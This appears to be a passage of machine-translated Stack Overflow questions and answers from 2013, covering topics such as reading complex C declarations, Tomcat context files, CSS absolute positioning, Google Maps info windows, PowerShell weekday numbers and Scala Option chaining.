                                            <asp:LinkButton ID="lbCopyPage" runat="server" CssClass="lnkbuttonText">Copy Page</asp:LinkButton>
                                        </td>
                                        <td class="formTopLinks">
                                            <img class="imgicons" src="../Layout/images/Copy.png" />
                                            <asp:LinkButton ID="lbDeletePage" runat="server" CssClass="lnkbuttonText">Delete Page</asp:LinkButton>
                                        </td>
                                        <td style="width: 20px;">
                                            <img class="imgicons" src="../Layout/images/left.png" />
                                        </td>
                                        <td style="width: 64px;">
                                            <asp:Label ID="Label1" runat="server" CssClass="lnkbuttonText" Text="Move Page" />
                                        </td>
                                        <td style="width: 20px;">
                                            <img class="imgicons" src="../Layout/images/right.png" />
                                        </td>
                                        <td>
                                            &#160;
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <br />
                            <table class="tblAll">
                                <tbody>
                                    <asp:PlaceHolder ID="phItemPlaceHoler" runat="server"></asp:PlaceHolder>
                                </tbody>
                            </table>                            
                       </LayoutTemplate>
                  </asp:ListView>    
              </asp:Panel>                   
          </ContentTemplate>            
      </asp:TabPanel>
  </asp:TabContainer> 
```

在哪里，我从表“问题”中得到问题，并从另一个表“答案”中得到答案。每个问题都与一个`PageNumber`.

所以，我必须`TabPanels`根据`PageNumber`问题创建，然后将问题标签与该问题绑定，并在第二个填写`ListView`该问题的答案。

这些答案是基于数据库条目的动态控件，例如`textbox`, `checkboxlists`,`radiobutton lists`并且可能因每个问题而异。

现在我正在做的是将 tabPanel 1 复制到 new`TabPanel`并根据 db 值添加问题和答案，但是当我创建 2nd 时`TabPanel`，它给了我错误

```
Cannot unregister UpdatePanel with ID 'ContentPlaceHolder1_tcQuestions_tpFirst_updatePanel' since it was not registered with the ScriptManager. This might occur if the UpdatePanel was removed from the control tree and later added again, which is not supported. 
```

处理这种场景的最佳方法是什么。

像[SurverMonkey 之](http://www.surveymonkey.com/)类的东西，除了我使用新页面的标签。

# c++ - 复杂的 C 声明

> ID：15111526
> 
> 赞同：70
> 
> 时间：2013-02-27T11:57:31.870
> 
> 标签：c++, c, function-pointers, declaration

我只是在互联网上浏览了一些代码，发现了这个：

```
float * (*(*foo())[SIZE][SIZE])() 
```

我如何阅读这份声明？是否有一套特定的规则来阅读如此复杂的声明？

* * *

## 回答 #1

> 赞同：119
> 
> 时间：2013-02-27T12:20:31.630

我有一段时间没有这样做了！

开始`foo`并向右走。

`float * (*(*`[`foo()`]`)[SIZE][SIZE])()`

> foo 是一个没有参数的函数......

不能正确，因为有一个右括号。往左走：

`float * (*(`[`* foo()`]`)[SIZE][SIZE])()`

> foo 是一个没有参数的函数，返回一个指针

不能再往左走，所以让我们划掉括号，然后再往右走

`float * (*`[`(* foo())`]`[SIZE][SIZE])()` `float * (*`[`(* foo())[SIZE]`]`[SIZE])()` `float * (*`[`(* foo())[SIZE][SIZE]`]`)()`

> foo 是一个没有参数的函数，它返回一个指向 SIZE 数组的指针，该数组的大小为 SIZE ...

到达右括号，再次向左到达指针符号：

`float * (`[`*(* foo())[SIZE][SIZE]`]`)()`

> foo 是一个没有参数的函数，返回一个指向 SIZE 数组的指针，该数组的 SIZE 指针指向 ...

再次左括号，所以我们越过它并再次向右走：

`float *`[`( *(* foo())[SIZE][SIZE])`]`()` `float *`[`( *(* foo())[SIZE][SIZE])()`]

> foo 是一个没有参数的函数，它返回一个指向 SIZE 数组的指针，该数组指向一个没有参数的函数的 SIZE 指针...

并留到最后

[`float * ( *(* foo())[SIZE][SIZE])()`]

> foo 是一个没有参数的函数，它返回一个指向 SIZE 数组的指针 指向一个没有参数的函数的 SIZE 数组的指针，返回一个指向浮点数的指针

* * *

不管是谁写的，请教他使用`typedef`：

```
// Function that returns a pointer to float
typedef float* PFloatFunc ();

// Array of pointers to PFloatFunc functions
typedef PFloatFunc* PFloatFuncArray2D[SIZE][SIZE];

// Function that returns a pointer to a PFloatFuncArray2D
PFloatFuncArray2D* foo(); 
```

* * *

## 回答 #2

> 赞同：100
> 
> 时间：2013-02-27T12:31:15.390

标准规则：找到最左边的标识符并找出路，记住这一点`[]`并`()`在之前绑定`*`：

```
 foo                      -- foo
            foo()                    -- is a function
           *foo()                    -- returning a pointer
          (*foo())[SIZE]             -- to a SIZE-element array
          (*foo())[SIZE][SIZE]       -- of SIZE-element arrays
         *(*foo())[SIZE][SIZE]       -- of pointers
        (*(*foo())[SIZE][SIZE])()    -- to functions
      * (*(*foo())[SIZE][SIZE])()    -- returning pointers
float * (*(*foo())[SIZE][SIZE])();   -- to float 
```

所以想象一下你有一堆函数返回指针`float`：

```
float *quux();
float *bar();
float *bletch();
float *blurga(); 
```

假设您要将它们存储在 2x2 表中：

```
float *(*tab[SIZE][SIZE])() = {quux, bar, bletch, blurga}; 
```

`tab`是一个 SIZE x SIZE 指向函数的指针数组，该函数返回指向 的指针`float`。

现在让我们决定我们想要一个函数返回指向该表的指针：

```
float *(*(*foo())[SIZE][SIZE])()
{
  static float *(*tab[SIZE][SIZE])() = {quux, bar, bletch, blurga};
  return &tab;
} 
```

请注意，您可以有多个函数来构建不同函数的表，或者以不同的方式组织相同的函数：

```
float *(*(*qwerbl())[SIZE][SIZE])()
{
  static float *(*tab[SIZE][SIZE])() = {blurga, bletch, bar, quux};
  return tab;
} 
```

这是我能想到做这样的事情的唯一原因。你不应该经常在野外看到这样的类型（尽管它们偶尔会出现，而且我写过类似令人发指的东西而感到内疚）。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-02-27T12:01:32.383

根据[cdecl.org](http://cdecl.org/)

> 将 foo 声明为函数返回指向数组的指针 指向函数的指针的数组 SIZE 返回指向浮点的指针

如果您想手动解码，请使用 Luchian Grigore 给出的螺旋规则。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-02-27T12:21:42.977

这里最好的做法是转换为一系列 typedef。

```
typedef float * fnReturningPointerToFloat();
typedef fnReturningPointerToFloat* fnArray[SIZE][SIZE];
fnArray* foo(); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-02-27T12:01:22.180

通常，您可以尝试[cdecl.org](http://cdecl.org/)但您需要替换为`SIZE`

假设你换成`SIZE`12，你会得到：

> 将 foo 声明为函数返回指向数组 12 的指针的函数的指针的数组 12 的指针返回指向浮点的指针

我不确定这真的对你有帮助！

这里有两个观察：

1.  我猜这个代码旁边没有注释解释它的目的是什么（即不是技术解释它是什么，而是从功能/业务角度来看它正在实现什么）如果程序员需要使用像这样复杂的东西，它们应该足以向未来的维护者解释它的用途。
2.  当然，在 C++ 中，有更明显且可能更安全的方法来实现相同的目标。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-03-05T19:59:13.743

该文档为我提供了有关如何轻松准备任何 C 声明的最佳线索：

[http://c-faq.com/decl/spiral.anderson.html](http://c-faq.com/decl/spiral.anderson.html)

> 需要遵循三个简单的步骤：
> 
> *   从未知元素开始，沿螺旋/顺时针方向移动；当遇到以下元素时，用相应的英文语句替换它们：
>     
>     
>     *   `[X]`or `[]` => Array X size of ... 或 Array undefined size of ...
>         
>         
>     *   `(type1, type2)`=> 函数传递 type1 和 type2 返回 ...
>         
>         
>     *   `*`=> 指向...的指针
>         
>         
> *   继续以螺旋/顺时针方向执行此操作，直到所有标记都被覆盖。
>     
>     
> *   始终首先解决括号中的任何内容！

例子 ：

```
 +-------+
             | +-+   |
             | ^ |   |
        char *str[10];
         ^   ^   |   |
         |   +---+   |
         +-----------+

Question we ask ourselves: What is str?

``str is an...

- We move in a spiral clockwise direction starting with `str' and the first character we see is a `[' so, that means we have an array, so...
  ``str is an array 10 of...

- Continue in a spiral clockwise direction, and the next thing we encounter is the `*' so, that means we have pointers, so...
  ``str is an array 10 of pointers to...

- Continue in a spiral direction and we see the end of the line (the `;'), so keep going and we get to the type `char', so...
``str is an array 10 of pointers to char''

We have now ``visited'' every token; therefore we are done! 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2020-10-29T14:23:05.113

尽管上面的大多数答案都足够好，但缺乏一套完整的规则来解码复杂的 C 声明。我在下面提供了一个完整的集合来解码任何复杂的 C 声明。这组规则实际上是基于运算符的优先级。诸如右手螺旋规则之类的规则可以被认为是这些规则集的捷径。

首先，我们需要知道一些事情来解码声明。

**声明的“基本类型”**

AC 声明始终只有一种基本声明类型。这是声明的最左侧位置。例如 -

*   `int a`- 基本类型是'int'
*   `float *p`- 基本类型是“浮动”
*   `char (*p)[3]`- 基本类型是'char'

**优先级和关联性**

接下来我们需要知道`()`,`[]`和`*`- 解引用运算符的优先顺序

1.  `()`, `[]`- 关联性从左到右
2.  `*`- 关联性是从右到左

**与上述每个运算符对应的短语**

接下来我们需要知道每个算子对应的解码短语。前面的例子将清楚地说明这一点。

*   `()`- 函数返回
*   `[SIZE]`- 大小数组
*   `*`- 指向的指针

**现在按照下面的规则来解码声明**

1.  总是先写变量名，然后是“is”。

    例如 -

*   `int a`-*一个是*...
*   `float *p`- *p 是*...
*   `char (*p)[3]`- *p 是*...

2.  总是以基本类型结尾

    例如 -

*   `int a`- *a 是*... *int*
*   `float *p`- *p 是*...*浮动*
*   `char (*p)[3]`- *p 是*...*字符*

3.  现在使用以下子步骤填写中间部分

    *   从名称开始，按照运算符优先级和关联性选择下一个最高优先级运算符，并将与其对应的短语附加到解码字符串的中间部分。

    *   对剩余的声明重复上述子步骤，直到解码过程完成

**注意 1：** 为简单起见，我忽略了函数的参数，但它可以包含在对应于 . 的短语之后`()`。

**注意 2：** Parenthesis( `()`) 改变运算符的优先级顺序，就像在任何算术表达式中一样。

**注意 3：** 您可以在解码后的声明中使用括号来增加可读性（我在下面的一些示例中已经这样做了）。将每组 () 视为一个单元。

**注 4：** 一个 n 维数组实际上是一个*数组的数组 ... (n-1 times) array*。例如 - int A[2][3] - A 是 2 数组（3 int 数组），即 A 是 2 个元素的数组，其中每个元素都是包含 3 个整数的数组

例子

*   `int a`- *a 是整数*
*   `float *p`- *p 是指向浮点数的指针*
*   `char (*p)[3]`- p 是指向 3 个字符数组的指针

**一些复杂的声明示例**

1.  `int **p[10]`- p 是 10 个指向 int 的指针的数组
2.  `int (*p)[10]`- p 是指向 10 int 数组的指针
3.  `int *p(char *a)`-p 是函数返回指向 int 的指针
4.  `int (*p(char*a))[10]`- p 是函数返回（指向（10 int 数组）的指针）
5.  `int *(*p)()`- p 是指向（函数返回（指向 int 的指针））的指针
6.  `int (*p()[20])[10]`- p 是函数返回（20 的数组（指向（10 int 的数组）的指针））

这组规则也可以与它一起使用`const`- const 限定符修改它左侧的术语（如果存在），否则它修改它右侧的术语。

7.  `const int *p[10]`- p 是 10 个指向 int const 的指针的数组
8.  `int const *p[10]`- p 是 10 个指向 const int 的指针的数组（这与第 7 个示例相同）
9.  `int *const p[10]`- p 是 10 个指向 int 的 const 指针的数组

现在是一个非常复杂的示例，它在实践中不会在任何地方使用，但仍可用于演示解码过程

10.  `char *(*(**foo[][8])())[]`- foo 是数组 (array of 8 (pointer to (pointer to (function returned (pointer to (array of (pointer to char)))))))

现在终于解码问题中给出的声明

`float * (*(*foo())[SIZE][SIZE])()`- foo 是函数返回 (pointer to (array of SIZE (array of SIZE (pointer to (function return pointer to float)))))

**以下是我阅读此解码过程的文章的链接**

示例 10 摘自本文

[http://www.unixwiz.net/techtips/reading-cdecl.html](http://www.unixwiz.net/techtips/reading-cdecl.html)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-02-27T12:01:55.467

来自[http://cdecl.org/](http://cdecl.org/)

将 foo 声明为函数返回指向数组的指针 指向函数的指针的数组 SIZE 返回指向浮点的指针

# java - 防止tomcat 7在每次覆盖/取消部署我的webapp时删除我的自定义上下文文件

> ID：15111527
> 
> 赞同：15
> 
> 时间：2013-02-27T11:57:31.837
> 
> 标签：java, deployment, tomcat7, datasource

我在 tomcat 7 上部署了一个 Web 应用程序。其名为 myAppName.xml 的上下文文件位于 `$CATALINA_HOME/conf/Catalina/localhost folder.`

我面临的问题是，在每次覆盖或取消部署时，我的配置文件都会从`$CATALINA_HOME/conf/Catalina/localhost`文件夹中删除，我必须复制/粘贴它从备份位置。

如何防止这种行为？我不想每次在 webapp 中更改某些内容时都复制/粘贴上下文文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:26:02.733

将其放入源代码树中的 web/META-INF 中，然后 Tomcat 将在每次部署时将其复制到 conf/.... 中。默认情况下，Tomcat 7 甚至不会这样做，只需在它所在的地方使用它。

# mysql - 在 phpMyAdmin 中插入时间值

> ID：15111531
> 
> 赞同：2
> 
> 时间：2013-02-27T11:57:59.370
> 
> 标签：mysql, database, phpmyadmin

我在我的数据库表的“departTime”列中输入 TIME 值。但我不需要“秒”值，我只需要“hh:mm”值。但是当我输入 TIME 为“07:25”时，我收到错误，phpMyAdmin 告诉我输入为“07:25:00”。可以省略秒吗？

另一种选择是使用 VARCHAR 或其他字段类型。但我有这样的疑问“ `SELECT * FROM table WHERE departTime >= $startTime AND departTime <= $stopTime`”

我有`$startTime = "14:15"`和`$stopTime = "16:00"`。如果我使用 VARCHAR 我无法比较时间值？除了手动输入每秒钟的值之外，还有什么更好的选择？

编辑：这有效：`UPDATE table SET`departTime`= "16:00" WHERE id = 12;`
但这不起作用：`INSERT INTO table (`departTime`) VALUES ("16:00");`

# facebook-graph-api - facebook 搜索运算符不起作用

> ID：15111536
> 
> 赞同：1
> 
> 时间：2013-02-27T11:58:12.863
> 
> 标签：facebook-graph-api, search

我正在使用 facebook search api [https://graph.facebook.com/search进行数据挖掘](https://graph.facebook.com/search)

但是这些运算符**OR | , AND +, "lorem ipsum"**不再起作用。有没有办法让它工作或解决方法？

# android - android中的控制启动器选项

> ID：15111540
> 
> 赞同：1
> 
> 时间：2013-02-27T11:58:31.320
> 
> 标签：android, android-launcher

我为视障人士创建了一个应用程序。当用户单击物理主页按钮时，我的启动器对话框工作得很好。

而不是内置对话框。我想获得包含启动器列表的活动屏幕，以便用户可以根据需要选择和打开任何启动器。

例如

如果用户有两个启动器

1.  启动器（默认）
2.  MyApp 启动器

在 myactivity 屏幕上，它应该显示启动器和 myApp，并且用户应该能够选择所需的任何内容。

这可能吗？如果是这样怎么办？有人可以将我引导到该页面作为开始吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:04:52.470

当用户按下主页按钮时，系统正在尝试实现`android.intent.category.HOME`意图。当没有用户偏好时弹出对话框，系统将始终控制此 UI。

您可以做的是自己实现这个意图，并成为默认启动器 - 即使您的启动器的操作是提供启动另一个启动器的方法？

# java - 日历，块年

> ID：15111543
> 
> 赞同：0
> 
> 时间：2013-02-27T11:58:33.037
> 
> 标签：java, android, android-calendar

我正在按照本教程在对话框中创建 DatePicker：

[http://www.edumobile.org/android/android-beginner-tutorials/using-android-date-picker/](http://www.edumobile.org/android/android-beginner-tutorials/using-android-date-picker/)

现在，我希望唯一可用的年份是 2012 年和 2013 年。

```
final Calendar c = Calendar.getInstance();
mYear = c.get(Calendar.YEAR);
mMonth = c.get(Calendar.MONTH);
mDay = c.get(Calendar.DAY_OF_MONTH); 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:04:33.500

在 Android 中尝试[选择器。](http://developer.android.com/guide/topics/ui/controls/pickers.html)

并使用`DatePicker.setMaxDate()`并`DatePicker.setMinDate()`设定一个固定的年份。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:04:57.113

如果您在 a 中定义它，请使用以下参数`Layout`：

```
android:maxDate="12/31/2013"
android:minDate="01/01/2012" 
```

或者如果您没有在 xml 中定义它，请使用：

```
Calendar c_max = Calendar.getInstance(), c_min = Calendar.getInstance();
c_min.set(2012,0,1);
c_max.set(2013,11,31);
DatePicker.setMaxDate(c_max.getTimeInMillis());
DatePicker.setMinDate(c_min.getTimeInMillis()); 
```

# c# - telerik radcombobox : C# lambda 表达式以获取检查项的值列表

> ID：15111544
> 
> 赞同：0
> 
> 时间：2013-02-27T11:58:35.290
> 
> 标签：c#, lambda, telerik, radcombobox

目前我必须将这个简单的操作分为两部分，我相信这是对我隐藏的更好的方法：

```
List<int> selectedValues= new List<int>();
...
IEnumerable<RadComboBoxItem> checkedItems = from checkedItem in cblMagistrateCourts.Items.ToList()
                                             where checkedItem.Checked == true
                                             select checkedItem;
foreach (RadComboBoxItem item in checkedItems)
{
     if (item.Checked)
          selectedValues.Add(Convert.ToInt32(item.Value));
} 
```

我希望这仅在服务器端完成。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:10:18.753

这个怎么样？

```
List<int> selectedValues = cblMagistrateCourts.Items.Where(i => i.Checked)
                                                    .Select(i => Convert.ToInt32(i.Value))
                                                    .ToList(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-28T10:23:50.407

在选择checkedItem的同时转换值...

```
List<int> selectedValues = (from checkedItem in cblMagistrateCourts.Items.ToList()
                            where checkedItem.Checked == true
                            select Convert.ToInt32(checkedItem.Value)).ToList(); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-05-19T15:14:31.720

```
rcb.CheckedItems.Select(x => x.Value).ToList(); 
```

# ipad - iOS UITableView 与 UIPickerView

> ID：15111548
> 
> 赞同：0
> 
> 时间：2013-02-27T11:58:43.890
> 
> 标签：ipad, ios5, uitableview, uipickerview

我需要创建一个`UITableView`多列。在那里，表格的第一行会有一个常量块。当用户滚动表格时，将选择该块中的行。基本上它是一个带有`UIPickerView`.

我希望我能够上传一张图片来解释这一点。

我不知道该怎么做。这是混合`UITableView`视图和选择器视图。我可以将其实现为带有多列的选择器视图（该块充当自定义选择器）吗？

请帮忙。

谢谢，~维沙尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:59:09.593

您可以使用 UITableView 方法获取顶行中表示的数据的索引：

```
- (NSIndexPath *)indexPathForRowAtPoint:(CGPoint)point 
```

点在哪里 (CGPoint){0,0} （或与您的块/行 1 相交的某个点）

或者

```
 - (NSIndexPath *)indexPathForRowsInRect:(CGRect)rect 
```

rect 与您“阻止”有关的地方。

您将需要管理滚动，以便表格停止时，行的顶部与块或表格的顶部对齐。这个 UITableView 方法可能会很有帮助，你应该在你的 tableview 在滚动后停止时触发它：

```
- (void)scrollToRowAtIndexPath:(NSIndexPath *)indexPath 
              atScrollPosition:(UITableViewScrollPosition)scrollPosition 
                      animated:(BOOL)animated 
```

与`UITableViewScrollPositionTop`作为滚动位置

我希望您希望每列独立滚动。在这种情况下，每列需要一个 tableView。然后，您只需要确保您知道哪个 tableView 在您各自的委托和数据源方法中发送消息（易于管理，因为指向 tableView 的指针是这些方法中发送的第一个参数）。

# css - 为什么默认情况下具有“位置：绝对”的 div 不相对于文档？

> ID：15111549
> 
> 赞同：1
> 
> 时间：2013-02-27T11:58:44.893
> 
> 标签：css

我认为一般规则是，只要 div`foo`有`position: relative`，那么如果父级和祖先都没有任何非静态`position`（因此需要有一个`relative, absolute, or fixed`），那么 div`foo`现在将相对于整个文档的位置。

但在以下页面中：

[http://jsfiddle.net/4RcEn/6/](http://jsfiddle.net/4RcEn/6/)

```
<div id="box1"></div>
<div id="box2">
    <div id="box3">some text inside some text</div>
</div>

<style>
  #box1 { width: 300px; height: 100px; background: #ffd; margin-left: 60px }
  #box2 { width: 300px; height: 100px; background: #fa0; margin-left: 60px }
  #box3 { width: 100px; height: 80px; background: #af0; position: 
          absolute; left: 20px;  }
</style> 
```

`box3`实际上的行为是这样的：`left`is`20px`并且是相对于文档的，但是`top`是`auto`（默认情况下），并且实际上是相对于**容器 div**。只有当`top`设置为`0`、`0px`或其他值时，它才相对于文档。这是什么规则？

**PS**与规范中的规则，我没有看到一条规则说：如果`top`or`left`没有指定，那么行为就是这样那样。所以这是一个事实上的标准，如果没有指定，那么如果没有“包含块”（定义为非静态定位块），那么它不会相对于“初始块”？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:04:01.957

它*相*对于文档定位（这就是为什么`top: 0`将它一直移动到顶部的原因），但是如果您没有设置`top`任何值（即您将其保留为`auto`），则框没有理由从它的任何位置移动静态位置（如果你没有设置它通常会坐在哪里`position: absolute`）。

另请参阅[此答案](https://stackoverflow.com/questions/14828251/how-does-the-css-position-on-a-div-affects-position-of-sibling-division/14828488#14828488)和规范的第[9.3](http://www.w3.org/TR/CSS21/visuren.html#positioning-scheme)节和第[10节。](http://www.w3.org/TR/CSS21/visudet.html)尤其是第 10 节，它包含了管理静态定位的所有规则，如果不是过于技术性的话，也是相当全面的读物。

在这种情况下，元素应保持在静态位置的确切规则在第[10.6.4](http://www.w3.org/TR/CSS21/visudet.html#abs-non-replaced-height)节中。在您的场景中，您没有设置`top`or `bottom`，但您确实设置`height`了 ，因此列出的六个规则中的第二个规则适用：

> 2\. 'top' 和 'bottom' 是 'auto' 而 'height' 不是 'auto'，然后将 'top' 设置为静态位置，为 'margin-top' 和 'margin-bottom' 设置 'auto' 值为 0，并求解“底部”

所以一个绝对定位的元素需要保持在其正常的静态垂直位置，如果`top`没有给出其他`auto`的东西——它不应该任意移动自己。

此外，绝对定位元素的包含块总是要么是它最近的定位祖先（如果有的话），要么是初始包含块。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:08:14.683

[`top`从CSS 2.1 规范中](http://www.w3.org/TR/CSS21/visuren.html#propdef-top)关于属性的注释：

> 此属性指定绝对定位的框的上边距边缘在框的包含块的上边缘下方偏移多远。对于相对定位的盒子，偏移量是相对于盒子本身的顶部边缘的（即，盒子在正常流程中被赋予一个位置，然后根据这些属性从该位置偏移）。

对我来说，这意味着如果没有`top`指定，则该框位于其“自然”容器（其父级）的顶部。当`top` *被*指定时，它会偏移到最近的祖先`relative`或`absolute`定位（我假设`html`或`body`默认情况下）。

然后它[继续说](http://www.w3.org/TR/CSS21/visuren.html#comp-abspos)：

> ...这导致外盒的顶部相对于其包含块定位。定位框的包含块由最近的定位祖先建立（或者，如果不存在，则为初始包含块，如我们的示例所示）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:10:33.403

div3 是从 body 计算的，而不是从 div2 计算的。因为你没有指定 div 的“顶部”位置而不是 div3 从 div2 获得“顶部”并使你的顶点与 div2 的顶点相同。当您添加属性“顶部：0px；” 到 dov3 然后你会看到 div3 在哪里以及从哪个元素影响了 div3 的位置。

# javascript - Google Maps API v3（一次打开一个信息窗口）

> ID：15111555
> 
> 赞同：3
> 
> 时间：2013-02-27T11:59:21.640
> 
> 标签：javascript, google-maps, google-maps-api-3, infowindow

有人知道如何修改此代码，以便谷歌地图在您打开另一个信息窗口时关闭信息窗口吗？

换句话说，我希望始终只打开一个信息窗口。我在 stackoverflow 上环顾四周，但似乎无法在这段代码中实现人们的解决方案。

```
function initMapsDealers(){

objectLocation = new google.maps.LatLng(25.64152637306577, 1.40625);

var myOptions = {
    scrollwheel: false,
    zoom: 2,
    center: objectLocation,
    mapTypeId: google.maps.MapTypeId.ROADMAP
}

var map = new google.maps.Map(document.getElementById("map-canvas-dealers"), myOptions);
var image1 = '/gfx/iconPloegerGreen.png';
var image2 = '/gfx/iconPloegerGreen.png';
var image3 = '/gfx/iconPloegerDealer.png';

/* Info windows */
<?

function replace_newline($string) {
  return (string)str_replace(array("\r", "\r\n", "\n"), '', $string);
}

$i = 0;
foreach($dealers as $dealer)
{
    $dealerLanden[$dealer['Land']][] = $dealer;

    if($dealer['lat'] != "" && $dealer['lon'] != "")
    {
        $i++;

        ?>
        objectLocation<?= $i; ?> = new google.maps.LatLng(<?= $dealer['lat']; ?>, <?= $dealer['lon']; ?>);

        var contentString<?= $i; ?> =
            '<div class="infoWindow">'+
            '<strong><?= str_replace("'","", $dealer['name']); ?></strong><br>'+
            '<?= replace_newline($dealer['content']); ?>'+
            '</div>';

        var infowindow<?= $i; ?> = new google.maps.InfoWindow({
            content: contentString<?= $i; ?>
        }); 

        var marker<?= $i; ?> = new google.maps.Marker({
            position: objectLocation<?= $i; ?>,
            title:"<?= $dealer['name']; ?>",
            map: map,
            icon: <?

            if($dealer['group'] == "Hoofdkantoor"){ ?>image1<? }
            elseif($dealer['group'] == "Oxbo"){ ?>image2<? }
            elseif($dealer['group'] == "Dealers"){ ?>image3<? } 
            else{ ?>image1<? }?>

        }); 

        google.maps.event.addListener(marker<?= $i; ?>, 'click', function() {
            infowindow<?= $i; ?>.open(map,marker<?= $i; ?>);
        });
        <?
    }
}

?>                      

resizeSection();

}; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:13:12.830

[如果您只想要 InfoWindow 的一个 InfoWindow API 文档，](https://developers.google.com/maps/documentation/javascript/overlays#InfoWindows)那么有一个 google 建议该怎么做。

这是：

> InfoWindows 可以附加到标记对象（在这种情况下，它们的位置基于标记的位置）或地图本身的指定 LatLng。如果您希望一次只显示一个信息窗口（就像谷歌地图上的行为一样），您只需要创建一个信息窗口，您可以根据地图事件（例如用户点击）将其重新分配给不同的位置或标记。然而，与 Google Maps API V2 中的行为不同，如果您愿意，地图现在可以显示多个 InfoWindow 对象。
> 
> 要更改信息窗口的位置，您可以通过在信息窗口上调用 setPosition() 显式更改其位置，或者使用 InfoWindow.open() 方法将其附加到新标记。请注意，如果您在没有传递标记的情况下调用 open()，则 InfoWindow 将使用在构造时通过 InfoWindow 选项对象指定的位置。

因此，请尝试遵循这些建议。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-01-17T14:25:44.440

这是我一次只打开一个信息窗口的解决方案：

```
infowindow = new google.maps.InfoWindow({
    content: infocontent,
    maxWidth: 200
});
google.maps.event.addListener(marker, 'click', function() {

    if($('.gm-style-iw').length) {
         $('.gm-style-iw').parent().hide();
    }
    infowindow.open(map,marker);

}); 
```

# powershell - 使用 Powershell 如何获取工作日编号？

> ID：15111557
> 
> 赞同：15
> 
> 时间：2013-02-27T11:59:24.723
> 
> 标签：powershell

使用 Powershell 日期对象如何获取星期几，0 到 6，其中 0 是星期日，6 是星期六。我知道我可以使用下面的代码获取日期名称，但是由于没有 DayNumberOfWeek 或等效属性，我如何获取数字？

```
(Get-Date).DayOfWeek 
```

我想我可以在 switch 语句中使用上面代码中的日期名称将其转换为数字，但这似乎不是很有说服力。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-02-27T12:03:51.970

像这样：

```
( get-date ).DayOfWeek.value__ 
```

我建议将来以这种方式调查对象的哪些属性：

```
( get-date ).DayOfWeek | gm -f # gm is an alias for get-member 
```

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2013-02-27T15:44:28.753

好吧，`DayOfWeek`a 的属性`DateTime`不是字符串而是`DayOfWeek`枚举，所以最短的答案可能是

```
[Int] (Get-Date).DayOfWeek  # returns 0 through 6 for current day of week 
```

或者

```
[Int] [DayOfWeek] "Wednesday"  # returns 3 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-05-15T15:34:02.000

```
Get-Date -UFormat %u 
```

将返回格式化日期。

检查[http://technet.microsoft.com/en-us/library/hh849887.aspx](http://technet.microsoft.com/en-us/library/hh849887.aspx)了解更多信息

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-08-02T22:36:11.367

On Friday the 17th:

```
(get-date).DayOfWeek.value__ 
```

Returns `Friday`

```
(Get-Date).DayOfWeek 
```

Returns `5`

```
(Get-Date).Day 
```

Returns `17`

# f# - Xamarin Studio f# 项目无法在 OSX 上构建

> ID：15111560
> 
> 赞同：3
> 
> 时间：2013-02-27T11:59:34.393
> 
> 标签：f#, xamarin-studio

我创建了一个简单的 xamarin studio f# 项目和 f# unit 项目。当我建造时，我得到

```
unknown-file(1,1): Error FS2020: The assembly
 'Studio.app/Contents/MacOS/lib/monodevelop/AddIns/NUnit/nunit.framework.dll'
  is listed on the command line. 
  Assemblies should be referenced using a command line flag such as 
  '-r'. (FS2020) (FRXUI.Spec) 
```

生成模板项目后，我没有对源代码进行任何更改。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-05-07T07:27:34.417

问题是`space`在文件的路径中，参考应该是

`/Applications/Xamarin Studio.app/Contents/MacOS/lib/monodevelop/AddIns/NUnit/nunit.framework.dll`

目前[这里有一个已知问题](https://github.com/fsharp/fsharpbinding/issues/111)

您也可以通过使用 nuget 来解决它，我几乎总是将[fsunit](https://github.com/dmohl/FsUnit)与 NUnit 一起用于 F# 中的单元测试。如果您还没有它，您还可以获得[monodevelop-nuget-addin](https://github.com/mrward/monodevelop-nuget-addin)，它使这些软件包的安装非常容易。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T12:04:40.677

我也得到了这个。`nunit.framework`我通过用从源代码构建的版本替换我的测试项目中的引用来解决它。

# scala - 另一个 Option 对象内的 Scala Option 对象

> ID：15111565
> 
> 赞同：12
> 
> 时间：2013-02-27T11:59:54.447
> 
> 标签：scala, option, monads, scalaz

我有一个模型，它有一些选项字段，其中包含另一个选项字段。例如：

```
case class First(second: Option[Second], name: Option[String])
case class Second(third: Option[Third], title: Option[String])
case class Third(numberOfSmth: Option[Int]) 
```

我从外部 JSON 接收这些数据，有时这些数据可能包含 null，这就是这种模型设计的原因。

所以问题是：获得最深领域的最佳方法是什么？

```
First.get.second.get.third.get.numberOfSmth.get 
```

上面的方法看起来真的很难看，如果其中一个对象为 None，它可能会导致异常。我正在寻找 Scalaz lib，但没有找到更好的方法来做到这一点。

有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-02-27T12:05:58.183

解决方案是使用`Option.map`and `Option.flatMap`：

```
First.flatMap(_.second.flatMap(_.third.map(_.numberOfSmth))) 
```

或等价物（请参阅此答案末尾的**更新）：**

```
First flatMap(_.second) flatMap(_.third) map(_.numberOfSmth) 
```

